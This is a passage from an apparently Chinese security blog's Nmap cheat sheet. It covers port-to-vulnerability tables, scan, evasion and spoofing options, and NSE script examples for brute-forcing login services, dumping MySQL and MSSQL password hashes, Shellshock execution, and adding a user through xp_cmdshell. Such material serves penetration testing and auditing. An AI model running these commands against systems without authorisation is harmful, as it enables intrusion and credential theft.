<td align="center">5900,5901,5902</td>
<td align="center">vnc</td>
<td align="center">弱口令爆破</td>
</tr>
<tr>
<td align="center">5984</td>
<td align="center">CouchDB</td>
<td align="center">未授权访问导致任意指令执行</td>
</tr>
<tr>
<td align="center">6379</td>
<td align="center">Redis数据库</td>
<td align="center">未授权访问&#x2F;爆破</td>
</tr>
<tr>
<td align="center">6443</td>
<td align="center">Kubernetes API Server</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">7001&#x2F;7002</td>
<td align="center">weblogic</td>
<td align="center">java反序列化&#x2F;控制台弱口令&#x2F;控制台上传webshell&#x2F;SSRF</td>
</tr>
<tr>
<td align="center">80-89,443</td>
<td align="center">http&#x2F;https</td>
<td align="center">web应用漏洞&#x2F;OpenSSL心脏滴血</td>
</tr>
<tr>
<td align="center">8000</td>
<td align="center">JDWP</td>
<td align="center">远程命令执行漏洞</td>
</tr>
<tr>
<td align="center">8069</td>
<td align="center">zabbix服务</td>
<td align="center">远程命令执行&#x2F;注入</td>
</tr>
<tr>
<td align="center">8080-8089</td>
<td align="center">Jboss&#x2F;Tomcat&#x2F;Jenkins&#x2F;Resin&#x2F;Jetty</td>
<td align="center">控制台弱口令&#x2F;反序列化&#x2F;远程文件读取</td>
</tr>
<tr>
<td align="center">8083&#x2F;8086</td>
<td align="center">influxDB</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">8161</td>
<td align="center">ActiveMQ</td>
<td align="center">弱口令&#x2F;任意文件写入&#x2F;反序列化</td>
</tr>
<tr>
<td align="center">9000</td>
<td align="center">fastcgi</td>
<td align="center">远程命令执行</td>
</tr>
<tr>
<td align="center">9080-9081,9090</td>
<td align="center">Websphere控制台</td>
<td align="center">java反序列化&#x2F;弱口令</td>
</tr>
<tr>
<td align="center">9200&#x2F;9300</td>
<td align="center">elasticsearch</td>
<td align="center">未授权访问&#x2F;远程代码执行</td>
</tr>
<tr>
<td align="center">11211</td>
<td align="center">memcached</td>
<td align="center">未授权访问</td>
</tr>
<tr>
<td align="center">27017&#x2F;27018</td>
<td align="center">mongodb</td>
<td align="center">未授权访问&#x2F;爆破</td>
</tr>
<tr>
<td align="center">50000</td>
<td align="center">SAP</td>
<td align="center">远程代码执行</td>
</tr>
<tr>
<td align="center">50070,50030</td>
<td align="center">hadoop</td>
<td align="center">默认端口未授权访问</td>
</tr>
</tbody></table>
<p><em>Refer:</em> <a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
<h3 id="0x02-Nmap基础"><a href="#0x02-Nmap基础" class="headerlink" title="0x02 Nmap基础"></a>0x02 Nmap基础</h3><h4 id="1-参数总结"><a href="#1-参数总结" class="headerlink" title="1. 参数总结"></a>1. 参数总结</h4><table>
<thead>
<tr>
<th>功能</th>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>目标选取</td>
<td>-iL inputfilename (从列表中输入)<br><br> -iR hostnum (随机选择目标)<br><br> –exclude &lt;host1[，host2][，host3]，…&gt; (排除主机&#x2F;网络) <br><br> –excludefile excludefile (排除文件中的列表)</td>
<td>指定目标范围</td>
</tr>
<tr>
<td>主机发现</td>
<td>a. -sL (列表扫描) <br><br> b. -sP (Ping扫描) <br><br> c. -P0 (无ping) <br><br> d. -PS [portlist] (TCP SYN Ping) <br><br> e. -PA [portlist] (TCP ACK Ping)<br><br> f. -PU [portlist] (UDP Ping)<br><br> g. -PE; -PP; -PM (ICMP Ping Types) <br><br> h. -PR (ARP Ping)<br><br> i. -n (不用域名解析) <br><br> j. -R (为所有目标解析域名)<br><br>k. –system-dns (使用系统域名解析器)</td>
<td>a. 列出指定网络上的每台主机， 不发送任何报文到目标主机 <br><br> b. 默认情况下， 发送一个ICMP回声请求和一个TCP报文到80端口 <br><br> c. 禁止主机发现，使Nmap对每一个指定的目标IP地址进行扫描 <br><br> d. 发送一个设置了SYN标志位的空TCP报文，适用于突破有状态的规则来封锁非预期的报文的防火墙 <br><br> e. 设置TCP的ACK标志位，适用于突破无状态防火墙规则 <br><br> f. 可穿越只过滤TCP的防火墙和过滤器，默认端口31338 <br><br> g. -PE选项打开该回声请求功能，时间戳和地址掩码查询可以分别用-PP和-PM选项发送 <br><br> h. ARP扫描比基于IP的扫描更快更可靠，常用于扫描一个以太局域网，不想要ARP扫描，指定–send-ip <br><br> i. 不对发现的活动IP地址进行反向域名解析，提升探测速度 <br><br> j. 对目标IP地址作反向域名解析，当发现机器正在运行时进行这项操作 <br><br> k. 执行较慢，多用于IPv6扫描</td>
</tr>
<tr>
<td>端口扫描</td>
<td>a. -sS (TCP SYN扫描) <br><br>b. -sT (TCP connect()扫描) <br><br>c. -sU (UDP扫描) <br><br>d. -sN; -sF; -sX (TCP Null，FIN，and Xmas扫描) <br><br>e. -sA (TCP ACK扫描) <br><br> f. -sW (TCP窗口扫描)<br><br>g. -sM (TCP Maimon扫描)<br><br> h. –scanflags (定制的TCP扫描)<br><br>i. -sI &lt;zombie host[:probeport]&gt; (Idlescan) <br><br>j. -sO (IP协议扫描) <br><br> k. -b [ftp relay host] (FTP弹跳扫描)</td>
<td>a. 半开放扫描，发送一个SYN报文，然后等待响应， SYN&#x2F;ACK表示端口在监听 (开放)，RST (复位)表示没有监听者<br><br>b. 全连接扫描，通过创建connect() 系统调用要求操作系统和目标机以及端口建立连接，连接易被记录 <br><br>c. 常用UDP服务：DNS，SNMP，和DHCP (注册的端口是53，161&#x2F;162，和67&#x2F;68)；UDP扫描发送空的UDP报头到每个目标端口，若服务响应一个UDP报文，证明该端口是open(开放的)；扫描较慢 <br><br> d. 如果收到一个RST报文，该端口被认为是 closed(关闭的)，没有响应则意味着端口是open&#x2F;filtered(开放或者被过滤的)；收到ICMP不可到达错误(类型 3，代号 1，2，3，9，10，或者13)，该端口就被标记为被过滤的 <br><br>e. 设置ACK标志位， open(开放的)和closed(关闭的) 端口都会返回RST报文，标记为 unfiltered(未被过滤的)；不响应的端口或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10， 或者13)的端口，标记为 filtered(被过滤的) <br><br>f. 根据TCP窗口值是正数还是0，分别把端口标记为open或者 closed <br><br> g. 探测报文是FIN&#x2F;ACK，其余与Null，FIN，以及Xmas扫描完全一样<br><br>h. 通过指定任意TCP标志位来设计自己的扫描 <br><br> i. 允许对目标进行真正的TCP端口盲扫描，无报文从所用真实IP地址发送到目标<br><br>j. 确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等) <br><br>k. 请求FTP服务器轮流发送一个文件到目标主机上的所感兴趣的端口，错误消息会描述端口是开放还是关闭的</td>
</tr>
<tr>
<td>服务&#x2F;版本探测</td>
<td>a. -sV (版本探测) <br><br> b. –allports (不为版本探测排除任何端口)<br><br>c. –version-intensity [intensity] (设置版本扫描强度) <br><br>d. –version-light (打开轻量级模式) <br><br>e. –version-all (尝试每个探测) <br><br> f. –version-trace (跟踪版本扫描活动)<br><br>g. -sR (RPC扫描)</td>
<td>a. 可以用-A同时打开操作系统探测和版本探测<br><br>b. 指定–allports扫描所有端口，默认情况下，Nmap版本探测会跳过9100TCP端口(打印机服务) <br><br> c. 进行版本扫描(-sV)时，nmap发送一系列探测报文 ，每个报文都被赋予一个1到9之间的值，数值越高， 服务越有可能被正确识别；强度值必须在0和9之间，默认是7<br><br>d. –version-intensity 2的别名，使版本扫描快许多，但它识别服务的可能性也略微小一点 <br><br>e. –version-intensity 9的别名， 保证对每个端口尝试每个探测报文 <br><br>f. 打印出详细的关于正在进行的扫描的调试信息，是用–packet-trace所得到的信息的子集<br><br>g. 对所有被发现开放的TCP&#x2F;UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，被-sV版本探测包括</td>
</tr>
<tr>
<td>操作系统探测</td>
<td>a. -O (启用操作系统检测)<br><br> b. –osscan-limit (针对指定的目标进行操作系统检测)<br><br> c. –osscan-guess; –fuzzy (推测操作系统检测结果)</td>
<td>a. 可以使用-A来同时启用操作系统检测和版本检测 <br><br> b. 只对满足条件的主机进行操作系统检测，可以节约时间，特别在使用-P0扫描多个主机时<br><br> c. 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配</td>
</tr>
<tr>
<td>时间&#x2F;性能</td>
<td>a. –min-hostgroup [milliseconds]; –max-hostgroup [milliseconds] (调整并行扫描组的大小)<br><br>b. –min-parallelism [milliseconds]; –max-parallelism [milliseconds] (调整探测报文的并行度)<br><br>c. –min-rtt-timeout [milliseconds]， –max-rtt-timeout [milliseconds]， –initial-rtt-timeout [milliseconds] (调整探测报文超时)<br><br>d. –host-timeout [milliseconds] (放弃低速目标主机)<br><br> e. –scan-delay [milliseconds]; –max-scan-delay [milliseconds] (调整探测报文的时间间隔)<br><br>f. -T [Paranoid&#x2F;Sneaky&#x2F;Polite&#x2F;Normal&#x2F;Aggressive&#x2F;Insane] (设置时间模板)</td>
<td>a. 将多个目标IP地址空间分成组，然后在同一时间对一个组进行扫描；主要用途是说明一个最小组的大小，使得整个扫描更加快速，通常选择256来扫描C类网段<br><br>b. 控制用于主机组的探测报文数量，可用于端口扫描和主机发现；–max-parallelism选项通常设为1，以防止Nmap在同一时间 向主机发送多个探测报文<br><br>c. 如果所有的主机都在本地网络，对于–max-rtt-timeout值来说，100毫秒比较合适。如果存在路由，使用ICMP ping工具ping主机，查看大约10个包的最大往返时间，然后将 –initial-rtt-timeout设成这个时间的2倍，–max-rtt-timeout 可设成这个时间值的3倍或4倍。不管ping的时间是多少，最大的rtt值不得小于100ms， 不能超过1000ms<br><br>d. 使用 –host-timeout选项来说明等待的时间(毫秒)<br><br>e. 用于控制针对一个主机发送探测报文的等待时间(毫秒)<br><br>f. Nmap使用6个时间模板，采用-T选项及数字(0 - 5) 或模板名称paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)优化扫描时间；默认模式为Normal(-T3)，-T4选项较常用，可适当加速扫描</td>
</tr>
<tr>
<td>隐蔽扫描</td>
<td>a. -f (报文分段); –mtu (使用指定的MTU) <br><br>b. -D &lt;decoy1 [，decoy2][，ME]，…&gt; (使用诱饵隐蔽扫描)<br><br>c. -S [IP_Address] (源地址哄骗) <br><br>d. -e [interface] (使用指定的接口)<br><br>e. –source-port [portnumber]; -g [portnumber] (源端口哄骗) <br><br> –spoof-mac [mac address，prefix，or vendor name] (MAC地址哄骗)</td>
<td>a. -f选项要求扫描时(包挺ping扫描)使用 小的IP包分段，使用–mtu选项可 以自定义偏移的大小，使用时不需要-f，偏移量必须 是8的倍数<br><br>b. 使用逗号分隔每个诱饵主机，也可用自己的真实IP作为诱饵，使用ME选项说明。如果在第6个位置或更后的位置使用ME选项，一些常用端口扫描检测器(如Solar Designer’s excellent scanlogd)就不会报告这个真实IP<br><br>c. -S选项并说明所需发送包的接口IP地址 <br><br>d. 告诉Nmap使用哪个接口发送和接收报文<br><br>e. -g和–source-port选项从指定端口发送数据<br><br>在发送原以太网帧时使用指定的MAC地址，这个选项隐含了 –send-eth选项，以保证Nmap真正发送以太网包</td>
</tr>
<tr>
<td>输出</td>
<td>a. -oN [filespec] (标准输出)<br><br>b. -oX [filespec] (XML输出) <br><br> c. –append-output (在输出文件中添加)<br><br> d. –resume [filename] (继续中断的扫描)<br><br> e. –stylesheet [path or URL] (设置XSL样式表，转换XML输出)</td>
<td>a. 将标准输出直接写入指定的文件<br><br>b. 要求XML输出直接写入指定的文件 <br><br> c. 保留现有内容，将结果添加在现 有文件后面，-oN选项有效<br><br> d. 标准扫描 (-oN)或Grep扫描(-oG)日志被保留，使用选项 –resume并说明标准&#x2F;Grep扫描输出文件，不允许使用其它参数，Nmap会解析输出文件并使用原来的格式输出<br><br> e. Nmap提从了XSL样式表nmap.xsl，用于查看或转换XML输出至HTML</td>
</tr>
<tr>
<td>细节信息</td>
<td>a. -v (提高输出信息的详细度)<br><br>b. -d [level] (提高或设置调试级别)<br><br> c. –packet-trace (跟踪发送和接收的报文)<br><br> d. –iflist (列举接口和路由)</td>
<td>a. 此选项使用两次，会提供更详细的信息  <br><br>b. 使用细节选项(-v)时，可启用命令行参数 (-d)，多次使用可提高调试级别<br><br>c. 要求Nmap打印发送和接收的每个报文的摘要，通常用于调试；为避免输出过多的行，可以限制扫描的端口数，如-p20-30；如果只需进行版本检测，使用–version-trace<br><br> d. 输出Nmap检测到的接口列表和系统路由，用于调试路由问题或设备描述失误</td>
</tr>
</tbody></table>
<h4 id="2-端口选项"><a href="#2-端口选项" class="headerlink" title="2. 端口选项"></a>2. 端口选项</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认情况下，Nmap用指定的协议对端口1到1024以及nmap-services 文件中列出的更高的端口在扫描</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-p [port ranges] (只扫描指定的端口)</td>
<td>指定想扫描的端口，覆盖默认值； -p U:53，111，137，T:21-25，80，139，8080：将扫描UDP 端口53，111，和137，同时扫描列出的TCP端口</td>
</tr>
<tr>
<td>-F (快速 (有限的端口) 扫描)</td>
<td>nmap-services 文件中(对于-sO，是协议文件)指定您想要扫描的端口</td>
</tr>
<tr>
<td>-r (不要按随机顺序扫描端口)</td>
<td>默认情况下，Nmap按随机顺序扫描端口，可以指定-r来顺序端口扫描</td>
</tr>
</tbody></table>
<h4 id="3-扫描实战"><a href="#3-扫描实战" class="headerlink" title="3. 扫描实战"></a>3. 扫描实战</h4><p>全面扫描目标主机的所有信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -A  -v 192.168.1.233</span><br></pre></td></tr></table></figure>

<p>扫描目标机器详细服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sV -sT -Pn --open -v 192.168.1.233</span><br></pre></td></tr></table></figure>

<p>探测目标操作系统类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ namp -O -v 192.168.0.233</span><br></pre></td></tr></table></figure>

<p>扫描指定的常用端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ namp -p U:53,111,137,T:21-25,80,139,8080 192.168.1.233</span><br></pre></td></tr></table></figure>

<p>内网arp扫描,探测内网存活主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sn -PR 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>快速扫描整个C段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -T5 --open 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>观察扫描时的详细发包过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap --packet-trace  192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>扫描目标机器服务banner信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sT -Pn --open -v banner.nse 192.168.1.233</span><br></pre></td></tr></table></figure>

<p>常用组合语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap --open -p port -Pn -v -sT -sV --script script_name ip/domain/cidr</span><br></pre></td></tr></table></figure>

<h3 id="0x03-脚本引擎"><a href="#0x03-脚本引擎" class="headerlink" title="0x03 脚本引擎"></a>0x03 脚本引擎</h3><h4 id="1-脚本分类"><a href="#1-脚本分类" class="headerlink" title="1. 脚本分类"></a>1. 脚本分类</h4><table>
<thead>
<tr>
<th>类别</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>auth</td>
<td>负责处理鉴权证书（绕开鉴权）的脚本</td>
</tr>
<tr>
<td>broadcast</td>
<td>在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务</td>
</tr>
<tr>
<td>brute</td>
<td>提供暴力破解方式，针对常见的应用如http&#x2F;snmp等</td>
</tr>
<tr>
<td>default</td>
<td>使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</td>
</tr>
<tr>
<td>discovery</td>
<td>对网络进行更多的信息，如SMB枚举、SNMP查询等</td>
</tr>
<tr>
<td>dos</td>
<td>用于进行拒绝服务攻击</td>
</tr>
<tr>
<td>exploit</td>
<td>利用已知的漏洞入侵系统</td>
</tr>
<tr>
<td>external</td>
<td>利用第三方的数据库或资源，例如进行whois解析</td>
</tr>
<tr>
<td>fuzze</td>
<td>模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽</td>
</tr>
<tr>
<td>malware</td>
<td>探测目标机是否感染了病毒、开启了后门等信息</td>
</tr>
<tr>
<td>safe</td>
<td>此类与intrusive相反，属于安全性脚本</td>
</tr>
<tr>
<td>version</td>
<td>负责增强服务与版本扫描（Version Detection）功能的脚本</td>
</tr>
<tr>
<td>vuln</td>
<td>负责检查目标机是否有常见的漏洞（Vulnerability）</td>
</tr>
</tbody></table>
<h4 id="2-脚本选项"><a href="#2-脚本选项" class="headerlink" title="2. 脚本选项"></a>2. 脚本选项</h4><table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-sC&#x2F;–script&#x3D;default</td>
<td>使用默认的脚本进行扫描</td>
</tr>
<tr>
<td>–script&#x3D;<Lua scripts></Lua></td>
<td>使用某个脚本进行扫描</td>
</tr>
<tr>
<td>–script-args&#x3D;x&#x3D;x,y&#x3D;y</td>
<td>为脚本提供参数</td>
</tr>
<tr>
<td>–script-args-file&#x3D;filename</td>
<td>使用文件来为脚本提供参数</td>
</tr>
<tr>
<td>–script-trace</td>
<td>显示脚本执行过程中发送与接收的数据</td>
</tr>
<tr>
<td>–script-updatedb</td>
<td>更新脚本数据库</td>
</tr>
<tr>
<td>–script-help&#x3D;[Lua scripts]</td>
<td>显示脚本的帮助信息</td>
</tr>
</tbody></table>
<h3 id="0x04-实用脚本"><a href="#0x04-实用脚本" class="headerlink" title="0x04 实用脚本"></a>0x04 实用脚本</h3><h4 id="1-FTP扫描脚本"><a href="#1-FTP扫描脚本" class="headerlink" title="1. FTP扫描脚本"></a>1. FTP扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p 21 --script ftp-bounce.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ftp-anon.nse</td>
<td>检查目标ftp是否允许匿名登录</td>
</tr>
<tr>
<td>ftp-bounce.nse</td>
<td>检查目标ftp是否允许使用弹跳法进行端口扫描</td>
</tr>
<tr>
<td>ftp-brute.nse</td>
<td>ftp爆破脚本</td>
</tr>
<tr>
<td>ftp-libopie</td>
<td>检查FTP是否存在CVE-2010-1938 (OPIE off-by-one 堆栈溢出)漏洞</td>
</tr>
<tr>
<td>ftp-vuln-cve2010-4221</td>
<td>ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</td>
</tr>
</tbody></table>
<h4 id="2-SSH扫描脚本"><a href="#2-SSH扫描脚本" class="headerlink" title="2. SSH扫描脚本"></a>2. SSH扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p 22 --script ssh-brute.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ssh-brute.nse</td>
<td>SSH爆破脚本</td>
</tr>
<tr>
<td>ssh-publickey-acceptance.nse｜公钥认证缺陷扫描</td>
<td></td>
</tr>
<tr>
<td>ssh-run.nse</td>
<td>SSH远程命令执行验证</td>
</tr>
<tr>
<td>sshv1.nse</td>
<td>检查是否存在sshv1低版本漏洞</td>
</tr>
</tbody></table>
<h4 id="3-Telnet扫描脚本"><a href="#3-Telnet扫描脚本" class="headerlink" title="3. Telnet扫描脚本"></a>3. Telnet扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>telnet-brute.nse</td>
<td>telnet爆破脚本</td>
</tr>
</tbody></table>
<h4 id="4-SMTP扫描脚本"><a href="#4-SMTP扫描脚本" class="headerlink" title="4. SMTP扫描脚本"></a>4. SMTP扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p  25 --script smtp-brute.nse 192.168.1.233</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>smtp-brute.nse</td>
<td>SMTP爆破脚本</td>
</tr>
<tr>
<td>smtp-enum-users</td>
<td>枚举目标smtp服务器的邮件用户名,需目标要存在此错误配置</td>
</tr>
<tr>
<td>smtp-vuln-cve2010-4344</td>
<td>Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</td>
</tr>
<tr>
<td>smtp-vuln-cve2011-1720</td>
<td>Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</td>
</tr>
<tr>
<td>smtp-vuln-cve2011-1764</td>
<td>Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞</td>
</tr>
</tbody></table>
<h4 id="5-POP3扫描脚本"><a href="#5-POP3扫描脚本" class="headerlink" title="5. POP3扫描脚本"></a>5. POP3扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p 110 --script pop3-brute.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>pop3-brute</td>
<td>pop简单弱口令爆破脚本</td>
</tr>
</tbody></table>
<h4 id="6-IMAP扫描脚本"><a href="#6-IMAP扫描脚本" class="headerlink" title="6. IMAP扫描脚本"></a>6. IMAP扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p 143,993 --script imap-brute.nse -v 192.168.1.233</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>imap-brute</td>
<td>imap简单弱口令爆破</td>
</tr>
</tbody></table>
<h4 id="7-DNS利用脚本"><a href="#7-DNS利用脚本" class="headerlink" title="7. DNS利用脚本"></a>7. DNS利用脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=target.org -v 192.168.1.233</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>dns-brute.nse</td>
<td>尝试通过暴力猜测常见子域来枚举DNS主机名</td>
</tr>
<tr>
<td>dns-fuzz.nse</td>
<td>对DNS服务器发起DNS模糊攻击</td>
</tr>
<tr>
<td>dns-random-srcport.nse</td>
<td>检查DNS服务器是否存在可预测的端口递归漏洞(CVE-2008-1447)</td>
</tr>
<tr>
<td>dns-zone-transfer</td>
<td>检查目标ns服务器是否允许传送</td>
</tr>
</tbody></table>
<h4 id="8-SNMP扫描脚本"><a href="#8-SNMP扫描脚本" class="headerlink" title="8. SNMP扫描脚本"></a>8. SNMP扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=user.txt 192.168.1.0/24</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>snmp-brute</td>
<td>SNMP暴力破解</td>
</tr>
</tbody></table>
<h4 id="9-LDAP扫描脚本"><a href="#9-LDAP扫描脚本" class="headerlink" title="9. LDAP扫描脚本"></a>9. LDAP扫描脚本</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -p 389 --script ldap-brute --script-args ldap.base=&#x27;&quot;cn=users,dc=cqure,dc=net&quot;&#x27; 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ldap-brute</td>
<td>尝试强行进行LDAP认证爆破</td>
</tr>
<tr>
<td>ldap-search</td>
<td>尝试执行LDAP搜索并返回所有匹配项</td>
</tr>
</tbody></table>
<h4 id="10-Web利用脚本"><a href="#10-Web利用脚本" class="headerlink" title="10. Web利用脚本"></a>10. Web利用脚本</h4><table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>xmpp-brute.nse</td>
<td>xmpp爆破</td>
<td>$ nmap -p 5222 –script xmpp-brute.nse  192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>http-iis-short-name-brute.nse</td>
<td>短文件扫描</td>
<td>$ nmap -p80 –script http-iis-short-name-brute.nse 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>http-shellshock.nse</td>
<td>bash远程执行</td>
<td>$ nmap -sV -p- –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;bin,cmd&#x3D;ls 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>http-svn-info.nse</td>
<td>探测目标svn</td>
<td>$ nmap –script http-svn-info 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>http-wordpress-brute.nse</td>
<td>wordpress爆破</td>
<td>$ nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb&#x3D;users.txt,passdb&#x3D;passwds.txt,http-wordpress-brute.hostname&#x3D;domain.com,http-wordpress-brute.threads&#x3D;3,brute.firstonly&#x3D;true’ 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>http-backup-finder.nse</td>
<td>扫描目标网站备份</td>
<td>$ nmap -p80 –script&#x3D;http-backup-finder 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>http-vuln-cve2015-1635.nse</td>
<td>iis6.0远程代码执行</td>
<td>$ nmap -sV –script http-vuln-cve* –script-args uri&#x3D;’&#x2F;anotheruri&#x2F;‘  192.168.1.0&#x2F;24</td>
</tr>
</tbody></table>
<h4 id="11-数据库利用脚本"><a href="#11-数据库利用脚本" class="headerlink" title="11. 数据库利用脚本"></a>11. 数据库利用脚本</h4><table>
<thead>
<tr>
<th>脚本</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>informix-brute.nse</td>
<td>informix爆破脚本</td>
<td>$ nmap -p 9088 –script informix-brute.nse 192.168.1.233</td>
</tr>
<tr>
<td>mysql-empty-password.nse</td>
<td>mysql 扫描root空密码</td>
<td>$ nmap -p 3306 –script mysql-empty-password.nse -v 192.168.1.233</td>
</tr>
<tr>
<td>mysql-brute.nse</td>
<td>mysql root弱口令简单爆破</td>
<td>$ nmap -p 3306 –script mysql-brute.nse -v 192.168.1.233</td>
</tr>
<tr>
<td>mysql-dump-hashes.nse</td>
<td>导出mysql中所有用户的hash</td>
<td>$ nmap -p 3306 –script mysql-dump-hashes –script-args&#x3D;’username&#x3D;root,password&#x3D;root’ 192.168.1.233</td>
</tr>
<tr>
<td>mysql-vuln-cve2012-2122.nse</td>
<td>Mysql身份认证漏洞[MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装]</td>
<td>$ nmap -p 3306 –script mysql-vuln-cve2012-2122.nse  -v 192.168.1.233</td>
</tr>
<tr>
<td>ms-sql-info.nse</td>
<td>扫描C段mssql</td>
<td>$ nmap -p 1433 –script ms-sql-info.nse –script-args mssql.instance-port&#x3D;1433 -v 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>ms-sql-empty-password.nse</td>
<td>扫描mssql sa空密码</td>
<td>$ nmap -p 1433 –script ms-sql-empty-password.nse -v 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>ms-sql-brute.nse</td>
<td>sa弱口令爆破</td>
<td>$ nmap -p 1433 –script ms-sql-brute.nse -v 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>ms-sql-xp-cmdshell.nse</td>
<td>利用xp_cmdshell,远程执行系统命令</td>
<td>$ nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username&#x3D;sa,mssql.password&#x3D;sa,ms-sql-xp-cmdshell.cmd&#x3D;”net user test test &#x2F;add” 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>ms-sql-dump-hashes.nse</td>
<td>导出mssql中所有的数据库用户及密码hash</td>
<td>$ nmap -p 1433 –script ms-sql-dump-hashes -v 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>pgsql-brute.nse</td>
<td>尝试爆破postgresql</td>
<td>$ nmap -p 5432 –script pgsql-brute -v 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>oracle-brute-stealth.nse</td>
<td>尝试爆破oracle</td>
<td>$ nmap –script oracle-brute-stealth -p 1521 –script-args oracle-brute-stealth.sid&#x3D;ORCL  -v 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>oracle-brute.nse</td>
<td>Oracle数据库爆破</td>
<td>$ nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid&#x3D;ORCL -v 192.168.1.0&#x2F;24</td>
</tr>
<tr>
<td>mongodb-brute.nse</td>
<td>尝试爆破mongdb</td>
